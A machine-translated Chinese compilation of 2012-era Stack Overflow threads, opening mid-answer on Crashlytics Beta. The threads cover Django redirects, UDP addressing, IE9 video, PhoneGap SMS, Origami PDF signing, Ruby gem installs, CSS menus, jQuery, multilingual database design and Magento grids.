以下是有关该服务的一些信息：[http ://www.crashlytics.com/blog/launching-beta-by-crashlytics/](http://www.crashlytics.com/blog/launching-beta-by-crashlytics/)

您可以在这里注册：[http ://try.crashlytics.com/beta/](http://try.crashlytics.com/beta/)

与 TestFlight 相比，我的客户更喜欢它，而对于作为开发人员的我来说，这也更容易，因为他们有一个 OS X 应用程序，我可以通过它上传档案并邀请新的测试人员（TestFlight 的桌面应用程序对我来说已经坏了）。

Crashlytics 提供的另一个非常好的功能是（如果您启用此功能），OS X 应用程序将自动上传符号文件。当应用程序为您的测试人员崩溃时，您会收到一封电子邮件（当这是一个新问题时），您可以查看发生的崩溃的统计信息和堆栈跟踪。

# python - 登录 Django 后根据用户名将用户重定向到自定义 url

> ID：12300685
> 
> 赞同：0
> 
> 时间：2012-09-06T12:59:47.087
> 
> 标签：python, django, django-urls

你好？一旦他们登录 django，我试图将特定用户重定向到自定义页面。管理员将被定向到他们通常的管理界面，而该特定用户将转到他们自己的自定义页面。我已经编写了这段代码并将其放在我的视图中

```
def custLogin(request):
    if request.user.username == '***':
        return HttpResponseRedirect('http://********************.html')
    else:
        return login(request,template_name='login.html') 
```

我已将 urls.py 中的帐户/登录 url 指向 custLogin，如下所示

```
(r'^accounts/login/', custLogin), 
```

但是我不断收到错误

```
Caught NoReverseMatch while rendering: Reverse for 'django.contrib.auth.views.login' with arguments '()' and keyword arguments '{}' not found. 
```

请问有什么指点吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-06T13:06:58.883

也许，您应该使用[重定向](https://docs.djangoproject.com/en/dev/topics/http/shortcuts/#redirect)快捷方式，它返回一个，在视图处理`HttpResponseRedirect`后将您的用户指向不同的地方。`custLogin`

```
from django.shortcuts import redirect
def custLogin(request):
    if request.user.is_staff:
        return redirect('/some/admin/url')
    else:
        return redirect('/some/regular/user/url') 
```

如文档所述，您可以通过`redirect()`多种方式使用该函数：通过传递视图名称、对象或 url。有关更多信息，请参阅[文档](https://docs.djangoproject.com/en/dev/topics/http/shortcuts/#redirect)

请注意，我使用[`is_staff`](https://docs.djangoproject.com/en/dev/topics/auth/#django.contrib.auth.models.User.is_staff)用户字段来确定：用户是否是管理员。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-06T13:10:10.990

在您的模板中，您可能忘记在模板开头执行此操作：

```
{% load from future url %} 
```

这在使用时很有用：

```
{% url 'name_of_my_url_inurl.py' %} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-06T13:18:17.297

为了将每个用户重定向到他自己的页面，请使用`reverse`

首先创建接受参数的 url 路由。[这里](https://docs.djangoproject.com/en/dev/topics/http/urls/#naming-url-patterns)有描述

并像重定向一样

```
return HttpResponseRedirect(reverse('arch-summary', args=[1945])) 
```

其中*arch-summary* - 命名为 url，在列表*args*中- 它的参数。[这里的](https://docs.djangoproject.com/en/dev/topics/http/urls/#reverse)例子

要区分管理员用户和普通用户，请在视图中检查并重定向到不同的 url。

# java - 如何在 DatagramSocket 中绑定远程套接字地址

> ID：12300690
> 
> 赞同：0
> 
> 时间：2012-09-06T12:59:57.747
> 
> 标签：java, jakarta-ee

如何在 UDP 套接字中设置远程机器地址，应该在接收者获取套接字地址时返回？

我的代码：

```
DatagramSocket socket = new DatagramSocket();

packet = new DatagramPacket(new byte[10],10);

packet.setAddress(InetAddress.getByName(hostName));

packet.setPort(portNum);

byte[] data = message.getBytes();

packet.setData(data);

packet.setLength(data.length);

socket.send(packet);
socket.close(); 
```

但这会使用我的本地地址创建一个套接字，接收器接收我的地址而不是远程主机地址。

解决方案是什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-06T13:06:10.857

您是提出请求的人，因此您的地址将是提交响应的地址。如果您希望远程机器接收响应，则 UDP 连接（数据报套接字连接）必须由远程机器而不是您自己建立。

# html - IE9 不显示 mp4 视频？

> ID：12300691
> 
> 赞同：4
> 
> 时间：2012-09-06T13:00:02.133
> 
> 标签：html, internet-explorer-9, html5-video

IE9 对 HTML5 视频的支持让我发疯，据我所知，它支持 H.264 编解码器，因此任何带有 .mp4 扩展名的文件。

问题是，它没有播放扩展名为 .mp4 的视频文件。. .

更不寻常的是，如果我在本地测试，IE9会播放mp4视频，只是在服务器上不播放，这也与MIME类型无关，我在服务器中添加了以下MIME类型：

.mp4 - 视频.mp4

在 IE 开发人员工具的网络面板中，它的类型为“video/mp4”，唯一不寻常的是网络面板显示 IE 正在请求它 3 次（我不知道为什么会这样）

我已经走到了尽头，以至于我实际上编写了下面的代码来尝试修复它（我真的很讨厌在实时站点上使用它，这太可怕了）：

```
 <!--[if !IE 9]><!-->
         <video controls="controls">
<!--<![endif]-->

<!-- This is a horrible way to do this, but I cannot figure out for the life of me why IE9 won't play this video :( -->
<!--[if !IE 9]><!-->
    <source src="video.ogv" type='video/ogg; codecs="theora, vorbis"'/>
    <source src="video.mp4" type="video/mp4">
<!--<![endif]-->

<!-- If HTML5 video is not supported, the following Flash video will play -->
<p>flash video stuff is here</p>

<!--[if !IE 9]><!-->
        </video>
<!--<![endif]--> 
```

这通过强制 IE9 对不支持 HTML 视频的浏览器使用 flash 视频来修复它（而不是默认情况下这样做，IE9 似乎只是显示一个空白框，没有错误消息，没有任何东西）。不幸的是，这个解决方案太可怕了，我几乎羞于写它。

有人知道是什么原因造成的吗？或者我该如何解决？

**编辑：**不确定这是否有任何意义，但我使用[http://www.freemake.com/free_video_converter/](http://www.freemake.com/free_video_converter/)将文件转换为正确的格式

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-05-26T17:19:42.117

我遇到了同样的问题。当您在本地运行 HTML 文件时，IE9 会播放视频，但是当您将其放在服务器上时，它就会停止工作。问题一定与视频文件有关。你会认为它不可能，因为它在本地工作。但情况似乎如此。当我在 VideoJS 网站 ( [http://vjs.zencdn.net/v/oceans.mp4](http://vjs.zencdn.net/v/oceans.mp4) ) 下载示例视频文件并将其放入我自己的设置中时，IE9 可以正常播放。所以IE9在播放远程文件时会更加挑剔。

当我弄清楚让 IE9 快乐所需的魔法参数时，我会更新这个答案。

更新：好的，我想我想通了。我花了一些时间比较 MP4 文件的工作与不工作的文件。在前者中，随机访问索引（“stss”原子）位于文件开头附近。在后者中，它位于文件的末尾。这两个位置都是合法的，但显然 IE9 太愚蠢了，无法在从网络下载文件时在文件末尾查找它。

解决方案是使用 ffmpeg 自带的工具将随机访问索引移动到 MP4 文件的开头：`qt-faststart`.

注意：我尝试了另一个工具：QTIndexSwapper。它似乎使文件损坏。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-10T12:39:18.000

我仍然完全不知道是什么原因造成的，我花了几个小时挖掘和挖掘，最后请其他人尝试他们的 IE9 版本，由于某种原因，它在他们的计算机上运行，​​而不是我的计算机。

我不完全确定为什么，我只是把它归结为我的 IE9 版本以某种方式被破坏（考虑到我花了多少时间试图解决这个问题，这令人沮丧！）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-06T13:08:21.987

stackoverflow上有一个答案。

也许这对你有用：

[HTML5 - mp4 视频无法在 IE9 中播放](https://stackoverflow.com/questions/6944679/html5-mp4-video-does-not-play-in-ie9)

我希望这有帮助...

# javascript - 从 javascript 或 html Phonegap 发送短信

> ID：12300697
> 
> 赞同：1
> 
> 时间：2012-09-06T13:00:14.327
> 
> 标签：javascript, html, cordova

我来自 Android 背景 最近开始研究 PhoneGap 我在发送短信时遇到问题，所以任何人都可以帮助我

我的意思是从 javascript 或 html 发送短信。现在我正在使用这段代码

```
var link="sms:55555555?body=hssssssss"
window.location.href=link 
```

提前致谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-21T08:01:38.890

您可以做的是使用随机函数获取随机时间戳，我的意思是您可以轻松获取随机长值，然后将该时间戳转换为日期对象，如下所示

[Java简单的时间戳到日期转换](https://stackoverflow.com/questions/3661137/java-simple-timestamp-to-date-conversion)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2018-02-09T23:45:28.160

它应该可以在纯 HTML 上完美运行，如下所示。

```
 <a href="sms:2547203100?body=My SMS message.">Click to Send SMS</a> 
```

但是使用纯 Java 脚本

```
 var link="sms:55555555?body=hssssssss"
   window.location.href=link 
```

它不起作用希望这有帮助

# pdf - 让 Origami-pdf 与 Amazon S3 文件一起使用

> ID：12300698
> 
> 赞同：0
> 
> 时间：2012-09-06T13:00:18.107
> 
> 标签：pdf, amazon-s3, digital-signature

我已经实现了一个本地脚本，将数字签名插入到 Origami 重复出现的本地 pdf 文件中，但不太清楚在 rails 服务器和亚马逊 s3 存储文件中执行此操作的最佳方法是什么。

我猜我需要将文件从 s3 下载到我的服务器（或者在上传到亚马逊之前捕获它，这就是我用回形针做的）插入签名，然后再次将其发送回 s3。

这是折纸解决方案的pdf.rb文件中的PDF.read方法：

```
 class << self

      #
      # Reads and parses a PDF file from disk.
      #
      def read(filename, options = {})
        filename = File.expand_path(filename) if filename.is_a?(::String)
        PDF::LinearParser.new(options).parse(filename)
      end 
```

我该如何调整它以便处理内存中的二进制文件？

你有什么建议吗？

[你可以在这里](http://code.google.com/p/origami-pdf/wiki/GettingStarted)找到更多关于折纸的信息

下面是我的代码

```
require 'openssl'

begin
  require 'origami'
rescue LoadError
  ORIGAMIDIR = "C:\RailsInstaller\Ruby1.9.3\lib\ruby\gems\1.9.1\gems\origami-1.2.4\lib"
  $: << ORIGAMIDIR
  require 'origami'
end
include Origami

INPUTFILE = "Sample.pdf"
@inputfile = String.new(INPUTFILE)
OUTPUTFILE = @inputfile.insert(INPUTFILE.rindex("."),"_signed")
CERTFILE = "certificate.pem"
RSAKEYFILE = "private_key.pem"
passphrase = "your passphrase"

key4pem=File.read RSAKEYFILE

key = OpenSSL::PKey::RSA.new key4pem, passphrase
cert = OpenSSL::X509::Certificate.new(File.read CERTFILE)

pdf = PDF.read(INPUTFILE)
page = pdf.get_page(1)

# Add signature annotation (so it becomes visibles in pdf document)

sigannot = Annotation::Widget::Signature.new
sigannot.Rect = Rectangle[:llx => 89.0, :lly => 386.0, :urx => 190.0, :ury => 353.0]

page.add_annot(sigannot)

# Sign the PDF with the specified keys
pdf.sign(cert, key, 
  :method => 'adbe.pkcs7.sha1',
  :annotation => sigannot, 
  :location => "Portugal", 
  :contact => "myemail@email.tt", 
  :reason => "Proof of Concept"
)

# Save the resulting file
pdf.save(OUTPUTFILE) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-06T15:26:11.367

[在对折纸代码](http://code.google.com/p/origami-pdf/source/search?q=parser.rb&origq=parser.rb&btnG=Search%20Trunk)进行深入分析后，我注意到 PDF.Read 接受二进制文件，因此我们可以发送整个文件实例，而不是发送本地文件路径。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-06T15:52:08.447

`PDF.read`和`PDF.save`方法都接受文件路径或 Ruby IO 对象。

从字符串创建 PDF 实例的一种方法（我想这就是您所说的“内存中”的意思）是使用[StringIO](http://www.ruby-doc.org/stdlib-1.9.3/libdoc/stringio/rdoc/StringIO.html)对象。

例如，Origami shell 中的以下会话将创建一个 PDF 实例，将其保存到 StringIO 对象并使用其自己的输出字符串重新加载它。

```
>>> PDF.new.save(strio = StringIO.new)
...

>>> strio.string
"%PDF-1.0\r\n1 0 obj\r\n<<\r\n\t/Pages 2 0 R ..."

>>> strio.reopen(strio.string, 'r')
#<StringIO:0xffbea6cc>

>>> pdf = PDF.read(strio)
...

>>> pdf.class
Origami::PDF 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2021-03-02T11:41:21.950

正如@MrWater 所写，`Origami::PDF.read`接受一个流（更准确地说，`Origami::PDF::LinearParser`确实如此，请在[此处](https://www.rubydoc.info/gems/origami/Origami/PDF/LinearParser)查看源代码）。

这是我的简单解决方案：

```
require 'open-uri'

# pdf_url = 'http://someurl.com/somepdf.pdf'
pdf = Origami::PDF.read(URI.parse(pdf_url)) 
```

## 参考

*   [开放 uri URI](https://www.rubydoc.info/stdlib/open-uri/URI)
*   [Origami::PDF::LinearParser](https://www.rubydoc.info/gems/origami/Origami/PDF/LinearParser)

# select - ExtJs 文本字段 - 选择输入的值

> ID：12300702
> 
> 赞同：0
> 
> 时间：2012-09-06T13:00:24.817
> 
> 标签：select, extjs, textfield

Extjs 文本字段：

我们如何使用鼠标或键（shift + 左箭头）选择 extjs 文本字段中的值？

默认情况下，我无法实现这一点。这是 extjs 文本字段中的错误吗？

# gwt - IE7中的GWT ListBox Scrollbar不拖动 - 需要双击Scrollbar才能拖动

> ID：12300708
> 
> 赞同：2
> 
> 时间：2012-09-06T13:00:38.660
> 
> 标签：gwt, css, scrollbar

我可以按向上/向下箭头（按住它们不起作用 - 只会向下一次） - 单击并拖动滚动条不起作用。双击滚动条然后拖动似乎可以工作。

注意 - 这适用于 Chrome 和 IE8 - 但我们必须支持 IE7。

我在 stackoverflow 上看到了与此类似的其他帖子，但所有修复程序都不适用 - 例如这篇帖子：[使用 css3pie 渐变时在 ie7 和 ie9 中滚动错误](https://stackoverflow.com/questions/10531224/scroll-bug-in-ie7-and-ie9-when-using-css3pie-gradient)- 是完全相同的错误。我的刚刚发生在 GWT 上。

任何帮助将不胜感激

# ruby-on-rails - Ruby on Rails - 如何在 Windows 中安装 capybara gem？

> ID：12300713
> 
> 赞同：1
> 
> 时间：2012-09-06T13:00:43.953
> 
> 标签：ruby-on-rails, windows-7, capybara

请帮我在 Windows 中安装 capybara gem。

```
>gem install capybara
Temporarily enhancing PATH to include DevKit...
Building native extensions.  This could take a while...
ERROR:  Error installing capybara:
        ERROR: Failed to build gem native extension.

        C:/Ruby193/bin/ruby.exe extconf.rb
checking for ffi.h... no
checking for ffi.h in /usr/local/include,/usr/include/ffi... no
checking for rb_thread_blocking_region()... yes
checking for ruby_native_thread_p()... yes
checking for rb_thread_call_with_gvl()... yes
creating extconf.h
creating Makefile

make
generating ffi_c-i386-mingw32.def
Configuring libffi
configure: WARNING: cache variable lt_cv_path_LD contains a newline
configure: WARNING: cache variable lt_cv_path_LD contains a newline
make -C "/c/Ruby193/lib/ruby/gems/1.9.1/gems/ffi-1.1.5/ext/ffi_c/libffi-i386-mingw32"
make[1]: Entering directory `/c/Ruby193/lib/ruby/gems/1.9.1/gems/ffi-1.1.5/ext/ffi_c/libffi-i386-mingw32'
Makefile:318: *** missing separator.  Stop.
make[1]: Leaving directory `/c/Ruby193/lib/ruby/gems/1.9.1/gems/ffi-1.1.5/ext/ffi_c/libffi-i386-mingw32'
make: *** ["/c/Ruby193/lib/ruby/gems/1.9.1/gems/ffi-1.1.5/ext/ffi_c/libffi-i386-mingw32"/.libs/libffi_convenience.a] Error 2

Gem files will remain installed in C:/Ruby193/lib/ruby/gems/1.9.1/gems/ffi-1.1.5 for inspection.
Results logged to C:/Ruby193/lib/ruby/gems/1.9.1/gems/ffi-1.1.5/ext/ffi_c/gem_make.out 
```

我已经按照同事的建议下载并安装了一些 1.7 GB 的“QT”，但没有任何效果。

**更新：**

```
>gem install ffi
Temporarily enhancing PATH to include DevKit...
Building native extensions.  This could take a while...
ERROR:  Error installing ffi:
        ERROR: Failed to build gem native extension.

        C:/Ruby193/bin/ruby.exe extconf.rb
checking for ffi.h... no
checking for ffi.h in /usr/local/include,/usr/include/ffi... no
checking for rb_thread_blocking_region()... yes
checking for ruby_native_thread_p()... yes
checking for rb_thread_call_with_gvl()... yes
creating extconf.h
creating Makefile

make
generating ffi_c-i386-mingw32.def
Configuring libffi
configure: WARNING: cache variable lt_cv_path_LD contains a newline
configure: WARNING: cache variable lt_cv_path_LD contains a newline
make -C "/c/Ruby193/lib/ruby/gems/1.9.1/gems/ffi-1.1.5/ext/ffi_c/libffi-i386-mingw32"
make[1]: Entering directory `/c/Ruby193/lib/ruby/gems/1.9.1/gems/ffi-1.1.5/ext/ffi_c/libffi-i386-min
gw32'
Makefile:318: *** missing separator.  Stop.
make[1]: Leaving directory `/c/Ruby193/lib/ruby/gems/1.9.1/gems/ffi-1.1.5/ext/ffi_c/libffi-i386-ming
w32'
make: *** ["/c/Ruby193/lib/ruby/gems/1.9.1/gems/ffi-1.1.5/ext/ffi_c/libffi-i386-mingw32"/.libs/libff
i_convenience.a] Error 2

Gem files will remain installed in C:/Ruby193/lib/ruby/gems/1.9.1/gems/ffi-1.1.5 for inspection.
Results logged to C:/Ruby193/lib/ruby/gems/1.9.1/gems/ffi-1.1.5/ext/ffi_c/gem_make.out 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-06T13:58:46.693

我之前在 windows xp 机器上运行过 capybara 测试。您可能需要 devkit：[http ://rubyinstaller.org/downloads/](http://rubyinstaller.org/downloads/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-06T14:11:13.050

[改用 RailsInstaller](http://railsinstaller.org/)可能会更好，它可以让您避免许多尝试整理除 RubyInstaller 本身以外的依赖项的陷阱。

# html - 寻找完美的下拉菜单：拉伸到全宽、等宽项、纯 CSS。请帮助解决故障

> ID：12300715
> 
> 赞同：5
> 
> 时间：2012-09-06T13:00:47.013
> 
> 标签：html, css, drop-down-menu

我正在尝试实现具有以下功能的**菜单：**

*   水平的;
*   等宽菜单项；
*   菜单项分布在整个页面宽度上（不仅仅是左侧拥挤）；
*   动态的（css 规则不应依赖于预定义的项目数量）；
*   带有垂直对齐项目的下拉第二级；
*   纯 CSS（没有 JS！）。

正如我所见，这似乎描述了一个完美的菜单。

我几乎成功地使用了漂亮的`display: table-cell;`技术（为简单起见省略了标签）：

```
<ul>
    <li>Menu item</li>
    <li>
        Expandable ↓
        <ul>
            <li>Menu</li>
            <li>Menu item</li>
            <li>Menu item long</li>
        </ul>
    </li>
    <li>Menu item</li>
    <li>Menu item</li>
</ul> 
```

```
ul {
    display: table;
    table-layout: fixed;
    width: 100%;
}

li {
    display: table-cell;
    text-align: center;    
}

li:nth-child(even){
    background-color: lightblue;    
}

li:nth-child(odd){
    background-color: lightskyblue;    
}

li ul { display: none; }

li:hover ul {
    display: block;
    position: absolute;
}

li:hover ul li {
    display: block;
} 
```

唯一的问题是子菜单项显示为整页宽度并部分显示在浏览器窗口之外，从而强制显示水平滚动条：

呸！StackOverflow 不允许我发布图片。在 JSFiddle 上进行现场测试：http: [//jsfiddle.net/6PTpd/9/](http://jsfiddle.net/6PTpd/9/)

`float: left; clear: both;`我可以通过添加来克服这个问题`li:hover ul li`。但是当我这样做时，子菜单项有不同的宽度：

小提琴：http: [//jsfiddle.net/6PTpd/10/](http://jsfiddle.net/6PTpd/10/)

...或宽度`width: 15%;`：http: [//jsfiddle.net/6PTpd/12/](http://jsfiddle.net/6PTpd/12/)

这两个修复都很丑陋，既不能解决等宽问题，也不能解决水平滚动条问题。

**UPD**在刷这篇文章时，我发现了滚动条问题的一些解决方案：将`li:hover ul`宽度设置为 0。但这会强制以绝对值指定子菜单项的宽度。:(见[http://jsfiddle.net/6PTpd/13/](http://jsfiddle.net/6PTpd/13/)

此外，当最后一个菜单项展开时，此解决方案可能会很糟糕。根据屏幕宽度，它可能仍然会使页面比窗口宽：http: [//jsfiddle.net/6PTpd/15/](http://jsfiddle.net/6PTpd/15/)

**问题：**

1.  如何在不启用水平滚动条的情况下使子菜单项与其父项显示相同的宽度？
2.  是否有另一种 CSS 技术允许创建具有文章开头所述的所有先决条件的菜单？

我找到了很多示例，但它们中的每一个要么是非拉伸的（将项目浮动到左侧）要么是非动态的（使用从预定义数量的项目中获取的大小，例如`width: 20%`对于五个一级项目中的每一个或，更糟糕的是，使用绝对大小！）。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-06T14:44:42.663

这不是最好的方法，但这是您的解决方案：http: [//jsfiddle.net/6PTpd/17/](http://jsfiddle.net/6PTpd/17/)

CSS 的有趣之处在于，即使是大师们也总是在寻找可以用它做的新东西。以这种方式，它是一种了不起的语言。这就是为什么我给你那个小提琴，这样你就可以知道你做错了什么（主要是绝对定位，顺便说一句）。但是也有一些你应该注意的漏洞。

因此，让我解释一下为什么您可能不应该使用该 JSFiddle 中的代码。第一个问题是它使用`display: none`. 这是一个问题，因为屏幕阅读器不会阅读未显示的文本。（更多关于这里：[http](http://css-tricks.com/places-its-tempting-to-use-display-none-but-dont/) ://css-tricks.com/places-its-tempting-to-use-display-none-but-dont/ ）

第二个问题是它在悬停时显示。在触摸屏变得越来越普遍的世界中，悬停不再是最佳选择。

如果你愿意，你仍然可以使用它，只是认为你应该知道它的缺点。

TL;DR：如果屏幕阅读器和触摸屏支持是一个问题，那么我鼓励您寻找其他选项。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-06T23:52:28.930

有很多方法可以使用 HTML 和 CSS 编码来制作完美的菜单，特别是如果您使用的是 HTML5 和 CSS3，您可以通过搜索互联网找到很多示例。[第二种简单的方法是使用诸如 Sothink DHTML Menu 或http://css3menu.com](http://css3menu.com)之类的程序，这些程序将使您的编码更容易

# jquery - 来自 div 的 jQuery remove() 不起作用

> ID：12300725
> 
> 赞同：-1
> 
> 时间：2012-09-06T13:01:15.970
> 
> 标签：jquery

嗨，我想在 jQuery 中删除一个 div。这是我的代码，但我已经测试并且不起作用，div 没有删除。帮我。

```
var img_old=$(".colCenter").find('#div_'+old_id);
img_old.delay(10).animate({top:1440},1500, function(){
img_old.remove();
}); 
```

这是html

```
<div class="colCenter" id="two">
    <div id="randomdiv" style="display:none;"></div>
    <div class="content" id="div_index">
        <div class="img_background">
                        <img src="img/sfondi/index.jpg" alt="" class="old_img" id="img_index"/>
                    </div>
                    <div class="logo_home">
                        <a href="index.php"><img src="img/logo_grande.png" alt="Web & Design" title="Web & Design" /></a>
                    </div>
                </div>
</div> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-06T13:06:52.803

[http://jsfiddle.net/mblase75/FJchB/](http://jsfiddle.net/mblase75/FJchB/) - 你的代码对我来说很好。

也许`old_id`您的代码中没有设置变量？我必须将它设置为“索引”才能让任何事情发生。

正如其他人所建议的那样，您还需要将代码包装在一个`$(document).ready{...}`块中，以便它仅在加载元素后运行。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-06T13:07:21.317

```
<script>
$(function(){
 var img_old=$(".colCenter").find('#divx');
 img_old.delay(10).animate({top:1440},1500, function(){
 img_old.remove();
});
});
</script>
<div class="colCenter">
<div  id="divx">Another one text 3</div> 
</div> 
```

对我来说很好。尝试在 DOM 就绪的地方执行 javascript 代码。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-06T13:08:36.747

检查是否`old_id`为“索引”，否则您的代码不起作用。因为只有div_index。

尝试在以下代码之间执行此代码：

```
$('document').ready( function() { 
```

和

```
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-06T13:07:50.287

在此示例中工作正常：

[jsfiddle](http://jsfiddle.net/jWDp3/)

**HTML**

```
ID: <input type="text" id="id" value="0"/>

<div>
   <div class="colCenter">
      <div id="div_0">0</div>
      <div id="div_1">1</div>
      <div id="div_2">2</div>
      <div id="div_3">3</div>
   </div>
</div>

<input type="button" id="button" value="Go"/> 
```

**JS**

```
$(function() {
    $('#button').click(function() {

        var old_id = $('#id').val();
        var img_old = $(".colCenter").find('#div_' + old_id);
        img_old.delay(10).animate({
            top: 1440
        }, 1500, function() {
            img_old.remove();
        });
    });
});​ 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-09-06T13:09:46.340

***试试这个***

```
var old_id = 'index';
var img_old = $('.colCenter').find('#div_' + old_id);
img_old.delay(10).animate({
    top: 1440
}, 1500, function() {
    img_old.remove();
}); 
```

# database - 多语言网站的数据库设计

> ID：12300737
> 
> 赞同：1
> 
> 时间：2012-09-06T13:01:55.030
> 
> 标签：database, database-design, relational-database

我需要创建支持多种语言的网站，但是我从来没有这样做过，我需要帮助来为我的应用程序创建数据库。

网站将是商业，所以我们以 ITEM 表为例。我唯一能很快想到的就是这个模型，但我认为这不是很好，因为 Language 表与 Item 表绑定，但我也会有 Company 表，其他人可能也有。

```
Item
    ID
    Price

Language
    ID
    ItemID
    Language (example: en-US)
    Field (example: title)
    Value (example: Good Title) 
```

有人可以帮我设计支持多种语言的优秀数据库吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-06T13:06:19.647

如何在数据库中存储多语言数据有多种方法，我通常这样做：

```
Item
  ID
  price
  title_translation_key_id (is a TranslationKey foreign key)
  desc_translation_key_id (is a TranslationKey foreign key)

TranslationKey
  ID
  key (string)

Translation
  ID
  translation_key_id (is a TranslationKey foreign key)
  content (string)
  language_id (is a Language foreign key)

Language 
  ID
  code 
```

**如何检索数据？**

您可以使用子选择，或者如果您的数据库性能不佳，您可以从中生成特定于语言的表。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2020-06-19T20:27:53.560

另一种可能的方法是将翻译保留为 json 对象。例如

```
Item
  Id   Price                       Name
   1    100     {"en":"Car", "fr":"voiture", "am":"մեքենա"} 
```

它非常简单，您不需要实现任何连接来检索数据。但是，您始终必须获得所有翻译。如果您支持很多语言，这可能不太好。

# magento - 我可以在 magento 模块中使用多个网格吗？

> ID：12300739
> 
> 赞同：2
> 
> 时间：2012-09-06T13:01:58.823
> 
> 标签：magento, grid

我可以在一个 magento 模块中使用多个网格吗？

```
<?php
class <Namespace>_<Module>_Block_Adminhtml_<Module> extends Mage_Adminhtml_Block_Widget_Grid_Container
{
  public function __construct()
  {
    $this->_controller = 'adminhtml_<module>';
    $this->_blockGroup = '<module>';
    $this->_headerText = Mage::helper('<module>')->__('Item Manager');
    $this->_addButtonLabel = Mage::helper('<module>')->__('Add Item');
    parent::__construct();
  }
} 
```

所以如果我必须使用模块，我可以创建一个网格，这意味着网格严重依赖模块，那么我们如何在同一个模块中使用多个网格？我找不到路，请指导我。

我在尝试让它继续前进时遇到了错误。我更多地描述它

我的网格容器

```
class World_Exporter_Block_Adminhtml_Import extends Mage_Adminhtml_Block_Widget_Grid_Container{
    public function __construct()
    {
                            // Correction made on getting answer
            $this->_controller = 'adminhtml_import';
            $this->_blockGroup = 'exporter';
                            // Correction made on getting answer

            $this->_headerText = Mage::helper('exporter')->__('Item Manager');
            $this->_addButtonLabel = Mage::helper('exporter')->__('Add Item');

    }
} 
```

和我的网格

```
class World_Exporter_Block_Adminhtml_Import_Grid extends Mage_Adminhtml_Block_Widget_Grid{
    public function __construct(){
            parent::__construct();
            $this->setId('imports');
            $this->setSaveParametersInSession(false);

                 // As it was not calling prepareCollection() I explicitly call it
                          $this->_prepareCollection();

    }

    protected function _prepareCollection(){

            $collection = Mage::getModel('exporter/imports')->getCollection();
            $this->setCollection($collection);
            return parent::_prepareCollection();
    }

    protected function _prepareColumns(){
        //  return false;
            $this->addColumn('import_id ', array(
                    'header' => Mage::helper('exporter')->__('ID'),
                    'align' => 'right',
                    'width' => '50px',
                    'index' => 'import_id ',
            ));
            $this->addColumn('import_file', array(
                    'header' => Mage::helper('exporter')->__('File Name'),
                    'align' => 'left',
                    'index' => 'import_file',
            ));
            $this->addColumn('import_time', array(
                    'header' => Mage::helper('exporter')->__('Import Time'),
                    'align' => 'left',

                    'index' => 'import_time',

            ));

            $this->addColumn('profile_id', array(
                    'header' => Mage::helper('exporter')->__('Profile'),
                    'align' => 'left',

                    'index' => 'profile_id',

            ));
            return parent::_prepareColumns();
    }

    protected function _prepareMassaction(){
            $this->setMassactionIdField('import_id');
            $this->getMassactionBlock()->setFormFieldName('imports');
            return $this;
    }

} 
```

我的控制器

```
class World_Exporter_Adminhtml_ExporterController extends Mage_Adminhtml_Controller_action{
    public function importAction(){
            $this->_initAction();
            $this->_addContent($this->getLayout()->createBlock('exporter/adminhtml_import'));
            $this->renderLayout();  

    }
} 
```

我的 confix xml 块

```
<models>
    <exporter>
        <class>World_Exporter_Model</class>

        <resourceModel>exporter_mysql4</resourceModel>
    </exporter>   
       <exporter_mysql4>
                <class>World_Exporter_Model_Mysql4</class>
                <!-- declate table test -->
                <entities>
                    <profiles>
                        <table>profiles</table>
                    </profiles>
                    <imports>
                        <table>imports</table>
                    </imports>
                    <columns>
                        <table>columns</table>
                    </columns>
                </entities>
                <!-- -/- -->
            </exporter_mysql4>
  </models> 
```

我的模型

```
 class World_Exporter_Model_Imports extends Mage_Core_Model_Abstract
   {
       public function _construct()
       {

           $this->_init('exporter/imports');
       }
   } 
```

Mysql4模型

```
 class World_Exporter_Model_Mysql4_Imports extends Mage_Core_Model_Mysql4_Abstract
  {
     public function _construct()
     {

    $this->_init('exporter/imports', 'import_id');
     }
  } 
```

我的收藏

```
 class World_Exporter_Model_Mysql4_Imports_Collection extends Mage_Core_Model_Mysql4_Collection_Abstract
  {
        public function _construct(){
                parent::_construct();
                $this->_init('exporter/imports');
        }
  } 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-06T13:42:48.923

是的你可以。以下是在一个模块中拥有多个网格时应采用的结构。

```
- Namespace
  - Module
     - Block
        - Adminhtml
           - Submodule1
              - Grid.php
           - Submodule2
              - Grid.php
           - Submodule3
              - Grid.php 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-07T13:46:20.670

查看您的网格容器：

```
class World_Exporter_Block_Adminhtml_Import extends Mage_Adminhtml_Block_Widget_Grid_Container{
    public function __construct()
    {
        //should be $this->_controller = 'adminhtml_import';
        $this->_controller = 'adminhtml_exporter';
        //should be $this->_blockGroup = 'exporter';
        $this->_blockGroup = 'import';
        $this->_headerText = Mage::helper('exporter')->__('Item Manager');
        $this->_addButtonLabel = Mage::helper('exporter')->__('Add Item');
        parent::__construct();
    }
} 
```

`$this->_controller = 'adminhtml_exporter';`应该`$this->_controller = 'adminhtml_import';`

`$this->_blockGroup = 'import';`应该`$this->_blockGroup = 'exporter';`

